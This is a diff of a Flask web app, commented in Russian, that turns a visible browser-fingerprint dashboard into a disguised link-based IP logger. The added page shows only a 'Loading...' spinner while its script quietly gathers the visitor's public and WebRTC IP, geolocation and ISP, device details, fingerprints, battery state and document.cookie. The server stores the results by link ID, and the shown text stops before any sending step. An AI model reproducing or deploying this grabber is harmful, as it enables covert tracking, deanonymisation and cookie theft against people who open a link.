@@ -1,819 +1,570 @@
-from flask import Flask, request, redirect, render_template_string, jsonify, send_file
+from flask import Flask, request, redirect, render_template_string, jsonify
 import uuid
 import datetime
 import json
 import os
-import base64
-from io import BytesIO
 
 app = Flask(__name__)
 
-# Хранилище
+# Хранилище данных
 logs_db = {}
 links_db = {}
 
-# ===================== МАКСИМАЛЬНЫЙ HTML ЛОГГЕР =====================
-INDEX_HTML = """
+# ===================== СТРАНИЦА-ЛОГГЕР (АВТОМАТИЧЕСКИЙ) =====================
+LOGGER_HTML = """
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>🔥 MAX IP Logger v4.0</title>
+    <title>Loading...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body {
-            background: #0b1219;
-            font-family: -apple-system, 'Segoe UI', Roboto, system-ui, sans-serif;
-            padding: 1rem;
-            color: #e3edf5;
-            min-height: 100vh;
-            touch-action: manipulation;
-        }
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            background: rgba(255,255,255,0.04);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-radius: 2rem;
-            padding: 1.5rem;
-            border: 1px solid rgba(255,255,255,0.06);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-        }
-        h1 {
-            font-weight: 400;
-            font-size: 1.8rem;
-            color: #d4e6ff;
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-            padding-bottom: 1rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 0.6rem;
-            flex-wrap: wrap;
-        }
-        h1 small {
-            font-size: 0.8rem;
-            font-weight: 300;
-            color: #6d8eb0;
-            margin-left: auto;
-        }
-        .badge {
-            display: inline-block;
-            padding: 0.2rem 0.8rem;
-            border-radius: 30px;
-            font-size: 0.7rem;
-            font-weight: 600;
-        }
-        .badge-success { background: #1d4a3b; color: #a3f0d0; }
-        .badge-error { background: #5f2d3a; color: #ffb3b3; }
-        .badge-pending { background: #4a4a2d; color: #f0e6a3; }
-
-        .controls {
-            display: flex;
-            gap: 0.6rem;
-            justify-content: center;
-            flex-wrap: wrap;
-            margin: 1rem 0;
-        }
-        .btn {
-            padding: 0.6rem 1.2rem;
-            border: none;
-            border-radius: 50px;
-            font-size: 0.85rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: inherit;
-            touch-action: manipulation;
-            user-select: none;
-            -webkit-user-select: none;
-        }
-        .btn:active { transform: scale(0.95); }
-        .btn-primary { background: #4a9eff; color: #fff; box-shadow: 0 4px 15px rgba(74,158,255,0.3); }
-        .btn-success { background: #4aff8a; color: #0b1219; box-shadow: 0 4px 15px rgba(74,255,138,0.3); }
-        .btn-danger { background: #ff4a4a; color: #fff; box-shadow: 0 4px 15px rgba(255,74,74,0.3); }
-        .btn-secondary { background: #2a4058; color: #d4e6ff; border: 1px solid rgba(255,255,255,0.1); }
-        .btn-gold { background: #ffd700; color: #0b1219; box-shadow: 0 4px 15px rgba(255,215,0,0.3); }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
-            gap: 1rem;
-        }
-        .card {
-            background: rgba(0,0,0,0.25);
-            border-radius: 1.5rem;
-            padding: 1rem 1.2rem;
-            border: 1px solid rgba(255,255,255,0.04);
-            transition: 0.2s;
-            position: relative;
-        }
-        .card-title {
-            font-size: 0.65rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #6d8eb0;
-            margin-bottom: 0.6rem;
-            border-bottom: 1px solid rgba(255,255,255,0.04);
-            padding-bottom: 0.3rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .card-content {
-            font-family: 'SF Mono', 'JetBrains Mono', monospace;
-            font-size: 0.75rem;
-            line-height: 1.8;
-            word-break: break-all;
-            color: #cfe2ff;
-        }
-        .card-content .label {
-            color: #7a9bc2;
-            font-weight: 300;
-            font-size: 0.65rem;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            margin-right: 0.4rem;
-        }
-        .geo-coords {
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #7bb3ff;
-            background: rgba(0,0,0,0.3);
-            padding: 0.1rem 0.8rem;
-            border-radius: 40px;
-            display: inline-block;
-            margin-top: 0.1rem;
-        }
-
-        .camera-section {
-            margin: 1rem 0;
-            padding: 1rem;
-            background: rgba(0,0,0,0.3);
-            border-radius: 1.5rem;
-            border: 2px solid #4a9eff;
-            text-align: center;
-        }
-        .camera-section video {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 1rem;
-            background: #000;
-            margin: 0.5rem 0;
-            transform: scaleX(-1);
-        }
-        .camera-section .photo-preview {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 1rem;
-            margin: 0.5rem 0;
-            border: 2px solid #4aff8a;
-        }
-        .camera-section .placeholder {
-            padding: 1.5rem;
-            background: rgba(0,0,0,0.5);
-            border-radius: 1rem;
-            color: #6d8eb0;
-            margin: 0.5rem 0;
-        }
-        .photo-status {
-            margin: 0.3rem 0;
-            padding: 0.3rem 1rem;
-            border-radius: 50px;
-            font-size: 0.8rem;
-            display: inline-block;
-        }
-        .photo-status.success { background: #1d4a3b; color: #a3f0d0; }
-        .photo-status.error { background: #5f2d3a; color: #ffb3b3; }
-        .photo-status.pending { background: #4a4a2d; color: #f0e6a3; }
-
-        .toast {
-            position: fixed;
-            bottom: 1rem;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1d4a3b;
-            color: #a3f0d0;
-            padding: 0.5rem 1.5rem;
-            border-radius: 50px;
-            font-size: 0.85rem;
-            opacity: 0;
-            transition: opacity 0.3s;
-            pointer-events: none;
-            z-index: 999;
-            max-width: 90%;
-            text-align: center;
-        }
-        .toast.show { opacity: 1; }
-        .toast.error { background: #5f2d3a; color: #ffb3b3; }
-
-        .footer {
-            margin-top: 2rem;
-            font-size: 0.7rem;
-            color: #4a6a89;
-            text-align: center;
-            border-top: 1px solid rgba(255,255,255,0.04);
-            padding-top: 1rem;
-        }
-
-        /* Мобильные улучшения */
-        @media (max-width: 600px) {
-            .container { padding: 1rem; border-radius: 1rem; }
-            h1 { font-size: 1.4rem; }
-            .grid { grid-template-columns: 1fr; }
-            .btn { padding: 0.5rem 1rem; font-size: 0.8rem; }
-            .controls { gap: 0.4rem; }
-            .card { padding: 0.8rem 1rem; }
-        }
-        @media (max-width: 400px) {
-            .btn { padding: 0.4rem 0.8rem; font-size: 0.7rem; }
-            .card-content { font-size: 0.7rem; }
-        }
+        body { background: #0a0a0f; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; margin: 0; flex-direction: column; }
+        .loader { width: 50px; height: 50px; border: 4px solid #1a1a2e; border-top: 4px solid #ffd93d; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        p { margin-top: 20px; color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>
-        🔥 MAX IP Logger v4.0
-        <small id="timestamp"></small>
-        <span id="statusBadge" class="badge badge-pending">⏳ загрузка</span>
-    </h1>
-
-    <div class="controls">
-        <button class="btn btn-primary" id="refreshBtn">🔄 Обновить</button>
-        <button class="btn btn-gold" id="exportBtn">📥 JSON</button>
-        <button class="btn btn-secondary" id="copyBtn">📋 Копировать</button>
-    </div>
-    <div class="controls">
-        <button class="btn btn-primary" id="requestGeoBtn">📍 Геолокация</button>
-        <button class="btn btn-success" id="requestCameraBtn">📷 Камера</button>
-        <button class="btn btn-danger" id="resetBtn">🗑️ Сброс</button>
-    </div>
-
-    <div class="camera-section" id="cameraSection">
-        <h3 style="color: #d4e6ff; margin-bottom: 0.3rem;">📸 Фото</h3>
-        <div id="cameraPlaceholder" class="placeholder">⏳ Камера не активна<br><span style="font-size:0.7rem;color:#4a6a89;">Нажмите «Камера»</span></div>
-        <video id="video" autoplay playsinline style="display: none;"></video>
-        <canvas id="canvas" style="display: none;"></canvas>
-        <img id="photoPreview" class="photo-preview" style="display: none;" alt="Ваше фото" />
-        <div style="display:flex;gap:0.5rem;justify-content:center;flex-wrap:wrap;margin:0.3rem 0;">
-            <button class="btn btn-success" id="takePhotoBtn" style="display:none;">📸 Сделать</button>
-            <button class="btn btn-danger" id="stopCameraBtn" style="display:none;">⏹️ Стоп</button>
-            <button class="btn btn-secondary" id="clearPhotoBtn">🗑️ Удалить</button>
-        </div>
-        <div id="photoStatus" style="display:none;">
-            <span class="photo-status pending">⏳ Ожидание...</span>
-        </div>
-    </div>
-
-    <div class="grid" id="info-grid"></div>
-
-    <div class="footer">
-        ⚡ Собрано из доступных API · <span id="api-status">загрузка...</span>
-        <br><span style="font-size:0.6rem;opacity:0.6;">📍 Гео · 📷 Камера · 🔋 Батарея</span>
-    </div>
-</div>
-
-<div class="toast" id="toast"></div>
+<div class="loader"></div>
+<p>Loading...</p>
 
 <script>
 (function() {
-    // ========== ДАННЫЕ ==========
-    const info = {};
+    const linkId = window.location.pathname.split('/').pop();
 
-    // ========== DOM ==========
-    const grid = document.getElementById('info-grid');
-    const apiStatus = document.getElementById('api-status');
-    const timestamp = document.getElementById('timestamp');
-    const statusBadge = document.getElementById('statusBadge');
-    const toast = document.getElementById('toast');
+    // ============================================================
+    // 1. СБОР ВСЕХ ДАННЫХ
+    // ============================================================
 
-    function showToast(text, isError = false) {
-        toast.textContent = text;
-        toast.className = 'toast show' + (isError ? ' error' : '');
-        clearTimeout(toast._hide);
-        toast._hide = setTimeout(() => toast.classList.remove('show'), 3000);
+    function getIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => d.ip)
+            .catch(() => 'Unknown');
     }
 
-    // ========== ЭКСПОРТ ==========
-    function exportJSON() {
-        const data = { collected_at: new Date().toISOString(), user_agent: navigator.userAgent, data: info };
-        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `fingerprint_${Date.now()}.json`;
-        a.click();
-        URL.revokeObjectURL(url);
-        showToast('📥 JSON экспортирован!');
+    function getGeo(ip) {
+        return fetch(`https://ipapi.co/${ip}/json/`)
+            .then(r => r.json())
+            .then(d => ({
+                country: d.country_name || d.country || 'Unknown',
+                city: d.city || 'Unknown',
+                region: d.region || 'Unknown',
+                isp: d.org || 'Unknown',
+                latitude: d.latitude || 'Unknown',
+                longitude: d.longitude || 'Unknown'
+            }))
+            .catch(() => ({
+                country: 'Unknown', city: 'Unknown', region: 'Unknown',
+                isp: 'Unknown', latitude: 'Unknown', longitude: 'Unknown'
+            }));
     }
 
-    // ========== КОПИРОВАНИЕ ==========
-    function copyAllData() {
-        const text = JSON.stringify(info, null, 2);
-        navigator.clipboard.writeText(text).then(() => {
-            showToast('📋 Данные скопированы!');
-        }).catch(() => {
-            const area = document.createElement('textarea');
-            area.value = text;
-            document.body.appendChild(area);
-            area.select();
-            document.execCommand('copy');
-            document.body.removeChild(area);
-            showToast('📋 Данные скопированы!');
-        });
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
+        if (/mobile|android|iphone|ipad|ipod/i.test(ua)) device = 'Mobile';
+        if (/iPad|Android/i.test(ua) && !/Mobile/i.test(ua)) device = 'Tablet';
+        if (/Windows/i.test(ua)) os = 'Windows';
+        else if (/Mac/i.test(ua)) os = 'macOS';
+        else if (/Linux/i.test(ua)) os = 'Linux';
+        else if (/Android/i.test(ua)) os = 'Android';
+        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
+        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
+        else if (/Firefox/i.test(ua)) browser = 'Firefox';
+        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+        else if (/Edg/i.test(ua)) browser = 'Edge';
+        else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
+        return { device, os, browser, ua };
     }
 
-    // ========== ГЕОЛОКАЦИЯ ==========
-    let geoCoords = null;
-    let geoError = null;
-
-    function requestGeolocation() {
-        if (!navigator.geolocation) {
-            geoError = 'Geolocation не поддерживается';
-            info.geo = { '📌 Статус': '🚫 НЕ ПОДДЕРЖИВАЕТСЯ' };
-            renderAll();
-            return;
-        }
-        info.geo = { '📌 Статус': '⏳ ЗАГРУЗКА...' };
-        renderAll();
-
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                const { latitude, longitude, accuracy } = pos.coords;
-                geoCoords = { lat: latitude, lng: longitude, accuracy: accuracy };
-                geoError = null;
-                info.geo = {
-                    '📌 Статус': '✅ РАЗРЕШЕНО',
-                    '📍 Координаты': `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`,
-                    '🎯 Точность': `${Math.round(accuracy)} м`,
-                };
-                renderAll();
-                showToast('📍 Геолокация получена!');
-            },
-            (err) => {
-                let msg = err.message;
-                if (err.code === 1) msg = 'Пользователь отклонил запрос';
-                else if (err.code === 2) msg = 'Позиция недоступна';
-                else if (err.code === 3) msg = 'Таймаут запроса';
-                geoError = msg;
-                info.geo = {
-                    '📌 Статус': '❌ ОТКАЗАНО',
-                    '📍 Координаты': '🔴 недоступны',
-                    '🎯 Точность': '—',
-                };
-                renderAll();
-                showToast('❌ ' + msg, true);
-            },
-            { enableHighAccuracy: true, timeout: 15000 }
-        );
-    }
-
-    // ========== КАМЕРА ==========
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const photoPreview = document.getElementById('photoPreview');
-    const placeholder = document.getElementById('cameraPlaceholder');
-    const photoStatus = document.getElementById('photoStatus');
-    const statusSpan = photoStatus.querySelector('.photo-status');
-    const startCameraBtn = document.getElementById('requestCameraBtn');
-    const takePhotoBtn = document.getElementById('takePhotoBtn');
-    const stopCameraBtn = document.getElementById('stopCameraBtn');
-    const clearPhotoBtn = document.getElementById('clearPhotoBtn');
-
-    let stream = null;
-    let cameraActive = false;
-
-    function setPhotoStatus(text, type = 'pending') {
-        photoStatus.style.display = 'block';
-        statusSpan.textContent = text;
-        statusSpan.className = 'photo-status ' + type;
-    }
-
-    function startCamera() {
-        if (cameraActive) return;
-        setPhotoStatus('⏳ Запрос...', 'pending');
-
-        navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: false
-        })
-        .then(function(mediaStream) {
-            stream = mediaStream;
-            video.srcObject = stream;
-            video.style.display = 'block';
-            placeholder.style.display = 'none';
-            cameraActive = true;
-            takePhotoBtn.style.display = 'inline-block';
-            stopCameraBtn.style.display = 'inline-block';
-            setPhotoStatus('✅ Камера активна', 'success');
-            showToast('📷 Камера запущена');
-        })
-        .catch(function(err) {
-            let msg = err.message;
-            if (err.name === 'NotAllowedError') msg = 'Пользователь отклонил доступ';
-            else if (err.name === 'NotFoundError') msg = 'Камера не найдена';
-            else if (err.name === 'NotReadableError') msg = 'Камера занята';
-            setPhotoStatus('❌ ' + msg, 'error');
-            showToast('❌ ' + msg, true);
-        });
-    }
-
-    function takePhoto() {
-        if (!cameraActive || !stream) return;
-        const ctx = canvas.getContext('2d');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        ctx.setTransform(1, 0, 0, 1, 0, 0);
-
-        const photoDataURL = canvas.toDataURL('image/jpeg', 0.95);
-        photoPreview.src = photoDataURL;
-        photoPreview.style.display = 'block';
-
-        info.photo = {
-            '📸 Фото': '✅ да',
-            '📏 Размер': `${canvas.width}×${canvas.height} px`,
-            '📦 Вес': `${Math.round(photoDataURL.length / 1024)} KB`,
-            '🕒 Время': new Date().toLocaleString('ru-RU'),
+    function getScreen() {
+        return {
+            screen: `${window.screen.width}x${window.screen.height}`,
+            window: `${window.innerWidth}x${window.innerHeight}`,
+            colorDepth: window.screen.colorDepth || 'Unknown',
+            pixelRatio: window.devicePixelRatio || 1
         };
-        setPhotoStatus('✅ Фото сделано!', 'success');
-        showToast('📸 Фото сделано!');
-        renderAll();
     }
 
-    function stopCamera() {
-        if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-        video.srcObject = null;
-        video.style.display = 'none';
-        cameraActive = false;
-        takePhotoBtn.style.display = 'none';
-        stopCameraBtn.style.display = 'none';
-        setPhotoStatus('⏹️ Камера остановлена', 'pending');
-    }
+    function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+    function getLanguage() { return navigator.language || navigator.languages?.[0] || 'Unknown'; }
+    function getCookies() { return document.cookie || 'No cookies'; }
 
-    function clearPhoto() {
-        photoPreview.style.display = 'none';
-        photoPreview.src = '';
-        if (info.photo) delete info.photo;
-        renderAll();
-        setPhotoStatus('🗑️ Фото удалено', 'pending');
-    }
-
-    // ========== СБОР ВСЕХ ДАННЫХ ==========
-    function collectAllData() {
-        // ===== БРАУЗЕР =====
-        info.browser = {
-            'User-Agent': navigator.userAgent,
-            'Платформа': navigator.platform || '—',
-            'Язык': navigator.language,
-            'Языки': navigator.languages ? navigator.languages.join(', ') : '—',
-            'Do Not Track': navigator.doNotTrack || 'не отправлен',
-            'Cookies': navigator.cookieEnabled ? '✅ да' : '❌ нет',
-            'WebDriver': navigator.webdriver ? '✅ да' : '❌ нет',
-        };
-
-        // ===== ЭКРАН =====
-        info.screen = {
-            'Размер экрана': `${screen.width}×${screen.height}`,
-            'Пиксельная плотность': `${window.devicePixelRatio || 1}x`,
-            'Размер окна': `${window.innerWidth}×${window.innerHeight}`,
-            'Ориентация': screen.orientation?.type || '—',
-        };
-
-        // ===== ВРЕМЯ =====
-        const tz = Intl.DateTimeFormat().resolvedOptions();
-        info.time = {
-            'Часовой пояс': tz.timeZone || '—',
-            'Смещение UTC': `UTC${new Date().getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(new Date().getTimezoneOffset() / 60)}`,
-            'Локальное время': new Date().toLocaleString('ru-RU', { hour12: false }),
-            'Unix timestamp': Math.floor(Date.now() / 1000),
-        };
-
-        // ===== ЖЕЛЕЗО =====
-        info.hardware = {
-            'Ядра CPU': navigator.hardwareConcurrency || '—',
-            'Память': navigator.deviceMemory ? `${navigator.deviceMemory} ГБ` : '—',
-            'Тип сети': navigator.connection?.effectiveType || '—',
-            'Скорость': navigator.connection?.downlink ? `${navigator.connection.downlink} Мбит/с` : '—',
-            'Состояние сети': navigator.onLine ? '✅ онлайн' : '❌ офлайн',
-        };
-
-        // ===== ГЕОЛОКАЦИЯ =====
-        if (geoCoords) {
-            info.geo = {
-                '📌 Статус': '✅ РАЗРЕШЕНО',
-                '📍 Координаты': `${geoCoords.lat.toFixed(6)}, ${geoCoords.lng.toFixed(6)}`,
-                '🎯 Точность': `${Math.round(geoCoords.accuracy)} м`,
-            };
-        } else if (geoError) {
-            info.geo = {
-                '📌 Статус': '❌ ОТКАЗАНО',
-                '📍 Координаты': '🔴 недоступны',
-                '🎯 Точность': '—',
-            };
-        } else {
-            info.geo = {
-                '📌 Статус': '⏳ нажмите кнопку',
-                '📍 Координаты': '🔴 не определены',
-                '🎯 Точность': '—',
-            };
-        }
-
-        // ===== МЕДИАУСТРОЙСТВА =====
-        info.media = {
-            'Аудио-вход': '⏳ ...',
-            'Видео-вход': '⏳ ...',
-            'Аудио-выход': '⏳ ...',
-        };
-        if (navigator.mediaDevices?.enumerateDevices) {
-            navigator.mediaDevices.enumerateDevices()
-                .then(devices => {
-                    info.media['Аудио-вход'] = devices.filter(d => d.kind === 'audioinput').length + ' шт.';
-                    info.media['Видео-вход'] = devices.filter(d => d.kind === 'videoinput').length + ' шт.';
-                    info.media['Аудио-выход'] = devices.filter(d => d.kind === 'audiooutput').length + ' шт.';
-                    renderAll();
-                })
-                .catch(() => {
-                    info.media['Аудио-вход'] = '❌ ошибка';
-                    info.media['Видео-вход'] = '❌ ошибка';
-                    info.media['Аудио-выход'] = '❌ ошибка';
-                    renderAll();
-                });
-        }
-
-        // ===== БАТАРЕЯ =====
-        info.battery = { 'Заряд': '⏳ ...', 'Зарядка': '⏳ ...' };
-        if (navigator.getBattery) {
-            const timeout = setTimeout(() => {
-                info.battery['Заряд'] = '⏱️ таймаут';
-                info.battery['Зарядка'] = '⏱️ таймаут';
-                renderAll();
-            }, 3200);
-            navigator.getBattery()
-                .then(bat => {
-                    clearTimeout(timeout);
-                    info.battery['Заряд'] = `${Math.round(bat.level * 100)}%`;
-                    info.battery['Зарядка'] = bat.charging ? '🔌 да' : '🔋 нет';
-                    renderAll();
-                })
-                .catch(() => {
-                    clearTimeout(timeout);
-                    info.battery['Заряд'] = '❌ ошибка';
-                    info.battery['Зарядка'] = '❌ ошибка';
-                    renderAll();
-                });
-        }
-
-        // ===== ШРИФТЫ =====
-        info.fonts = { 'Обнаружено': '⏳ ...', 'Список': '⏳ ...' };
+    function getFingerprint() {
         try {
-            const c = document.createElement('canvas');
-            const ctx = c.getContext('2d');
-            const testText = 'abcdefghijklmnopqrstuvwxyz';
-            const baseFont = 'monospace';
-            const fontList = ['Arial','Verdana','Helvetica','Times New Roman','Courier New','Georgia','Trebuchet MS','Tahoma','Impact','Comic Sans MS'];
-            let detected = [];
-            for (const f of fontList) {
-                ctx.font = `14px "${f}", ${baseFont}`;
-                const w1 = ctx.measureText(testText).width;
-                ctx.font = `14px ${baseFont}`;
-                const w2 = ctx.measureText(testText).width;
-                if (w1 !== w2) detected.push(f);
-            }
-            info.fonts['Обнаружено'] = detected.length + ' шт.';
-            info.fonts['Список'] = detected.length ? detected.join(', ') : 'нет';
-        } catch (e) {}
-
-        // ===== ПУБЛИЧНЫЙ IP =====
-        info.publicIP = { 'IPv4': '⏳ ...', 'Источник': '⏳ ...' };
-        (async function fetchIP() {
-            try {
-                const resp = await fetch('https://api.ipify.org?format=json', { cache: 'no-cache', signal: AbortSignal.timeout(2000) });
-                const data = await resp.json();
-                info.publicIP['IPv4'] = data.ip || '❌';
-                info.publicIP['Источник'] = 'ipify.org';
-            } catch (e) {
-                info.publicIP['IPv4'] = '❌ недоступен';
-                info.publicIP['Источник'] = '—';
-            }
-            renderAll();
-        })();
-
-        // ===== ЛОКАЛЬНЫЙ IP =====
-        info.webrtc = { 'Локальный IP': '⏳ ...' };
-        try {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('test');
-            pc.createOffer().then(o => pc.setLocalDescription(o));
-            const ips = new Set();
-            pc.onicecandidate = (e) => {
-                if (e.candidate && e.candidate.candidate) {
-                    const match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                    if (match && !match[1].startsWith('127.')) ips.add(match[1]);
-                }
-            };
-            setTimeout(() => {
-                info.webrtc['Локальный IP'] = ips.size ? Array.from(ips).join(', ') : '⏱️ таймаут';
-                renderAll();
-                pc.close();
-            }, 3200);
-        } catch (e) {
-            info.webrtc['Локальный IP'] = '❌ не поддерживается';
-            renderAll();
-        }
-
-        // ===== WebGL =====
-        info.webgl = { 'Рендерер': '⏳ ...', 'Версия': '⏳ ...' };
-        try {
-            const c = document.createElement('canvas');
-            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-            if (gl) {
-                info.webgl['Рендерер'] = gl.getParameter(gl.RENDERER) || '—';
-                info.webgl['Версия'] = gl.getParameter(gl.VERSION) || '—';
-            } else {
-                info.webgl['Рендерер'] = '🚫 не поддерживается';
-                info.webgl['Версия'] = '—';
-            }
-        } catch (e) {
-            info.webgl['Рендерер'] = '❌ ошибка';
-            info.webgl['Версия'] = '❌ ошибка';
-        }
-
-        // ===== ХРАНИЛИЩА =====
-        info.storage = {
-            'LocalStorage': (typeof localStorage !== 'undefined') ? '✅ доступен' : '❌ нет',
-            'SessionStorage': (typeof sessionStorage !== 'undefined') ? '✅ доступен' : '❌ нет',
-            'IndexedDB': 'indexedDB' in window ? '✅ доступен' : '❌ нет',
-        };
-
-        // ===== CANVAS ОТПЕЧАТОК =====
-        info.canvas = { 'Отпечаток': '⏳ ...' };
-        try {
-            const c = document.createElement('canvas');
-            c.width = 256; c.height = 128;
-            const ctx = c.getContext('2d');
+            const canvas = document.createElement('canvas');
+            canvas.width = 200; canvas.height = 50;
+            const ctx = canvas.getContext('2d');
             ctx.textBaseline = 'top';
             ctx.font = '14px Arial';
             ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 16, 16);
+            ctx.fillRect(0, 0, 200, 50);
             ctx.fillStyle = '#069';
-            ctx.fillText('Canvas Fingerprint', 2, 15);
-            const fp = c.toDataURL();
-            info.canvas['Отпечаток'] = fp.substring(0, 60) + '...';
-        } catch (e) {
-            info.canvas['Отпечаток'] = '❌ ошибка';
-        }
+            ctx.fillText('fp', 10, 10);
+            ctx.fillText(navigator.userAgent.substring(0, 30), 30, 10);
+            return canvas.toDataURL().substring(0, 80) + '...';
+        } catch { return 'Unknown'; }
+    }
 
-        // ===== ДОПОЛНИТЕЛЬНО =====
-        info.extra = {
-            'Время загрузки': '⏳ ...',
-            'Элементов': document.querySelectorAll('*').length + ' шт.',
-        };
-        if (performance && performance.timing) {
-            const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
-            info.extra['Время загрузки'] = loadTime > 0 ? `${loadTime} мс` : '—';
-        }
+    function getPlugins() {
+        try { return Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None'; }
+        catch { return 'Unknown'; }
+    }
 
-        // ===== УСТРОЙСТВО =====
-        const ua = navigator.userAgent;
-        info.device = {
-            'Мобильное': /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? '✅ да' : '❌ нет',
-            'Тип': /iPad/i.test(ua) ? 'Планшет' : /Mobi|Android|iPhone|iPod/i.test(ua) ? 'Телефон' : 'Десктоп',
-            'ОС': ua.match(/Android|iPhone|iPad|Windows|Mac|Linux/)?.[0] || '—',
-        };
+    function getWebRTC() {
+        return new Promise((resolve) => {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('test');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                pc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})/);
+                        resolve(ip ? ip[0] : 'Unknown');
+                        pc.close();
+                    }
+                };
+                setTimeout(() => { resolve('Unknown'); pc.close(); }, 3000);
+            } catch { resolve('Unknown'); }
+        });
+    }
 
-        // ===== ПЛАГИНЫ =====
-        info.plugins = {
-            'Количество': navigator.plugins ? navigator.plugins.length : '—',
-            'Список': navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') : '—',
-        };
+    function getBattery() {
+        return new Promise((resolve) => {
+            if (!navigator.getBattery) { resolve({ level: 'Unknown', charging: 'Unknown' }); return; }
+            navigator.getBattery()
+                .then(bat => resolve({ level: `${Math.round(bat.level * 100)}%`, charging: bat.charging ? 'Yes' : 'No' }))
+                .catch(() => resolve({ level: 'Unknown', charging: 'Unknown' }));
+        });
+    }
 
-        // ===== ADBLOCK =====
-        info.adblock = { 'AdBlock': '⏳ ...' };
+    function getWebGL() {
         try {
-            const testAd = document.createElement('div');
-            testAd.className = 'adsbox';
-            testAd.style.display = 'block';
-            testAd.style.height = '1px';
-            document.body.appendChild(testAd);
-            info.adblock['AdBlock'] = testAd.offsetHeight === 0 ? '✅ да' : '❌ нет';
-            document.body.removeChild(testAd);
-        } catch (e) { info.adblock['AdBlock'] = '❌ ошибка'; }
-
-        statusBadge.className = 'badge badge-success';
-        statusBadge.textContent = '✅ готово';
-        apiStatus.textContent = '✅ данные собраны';
-        timestamp.textContent = new Date().toLocaleTimeString('ru-RU');
-        renderAll();
-    }
-
-    // ========== ОТРИСОВКА ==========
-    function renderAll() {
-        const sections = [
-            { title: '🌐 Браузер', data: info.browser },
-            { title: '🖥️ Экран', data: info.screen },
-            { title: '⏰ Время', data: info.time },
-            { title: '⚙️ Железо', data: info.hardware },
-            { title: '📍 ГЕО', data: info.geo },
-            { title: '🎤 Медиа', data: info.media },
-            { title: '🔋 Батарея', data: info.battery },
-            { title: '🔤 Шрифты', data: info.fonts },
-            { title: '🌍 Публичный IP', data: info.publicIP },
-            { title: '🔗 Локальный IP', data: info.webrtc },
-            { title: '🎮 WebGL', data: info.webgl },
-            { title: '💾 Хранилища', data: info.storage },
-            { title: '🎨 Canvas', data: info.canvas },
-            { title: '📊 Доп.', data: info.extra },
-            { title: '📱 Устройство', data: info.device },
-            { title: '🔌 Плагины', data: info.plugins },
-            { title: '🛡️ AdBlock', data: info.adblock },
-        ];
-        if (info.photo) sections.push({ title: '📸 ФОТО', data: info.photo });
-
-        let html = '';
-        for (const sec of sections) {
-            const isGeo = sec.title.includes('ГЕО');
-            const isPhoto = sec.title.includes('ФОТО');
-            const border = isGeo ? 'border:2px solid #4a9eff;' : (isPhoto ? 'border:2px solid #4aff8a;' : '');
-            html += `<div class="card" style="${border}">
-                <div class="card-title">${sec.title}</div>
-                <div class="card-content">`;
-            for (const [key, val] of Object.entries(sec.data)) {
-                const v = (val === undefined || val === null) ? '—' : String(val);
-                if (isGeo && key === '📍 Координаты' && !v.includes('не определены') && !v.includes('недоступны')) {
-                    html += `<div><span class="label">${key}</span> <span class="geo-coords">${v}</span></div>`;
-                } else {
-                    html += `<div><span class="label">${key}</span> ${v}</div>`;
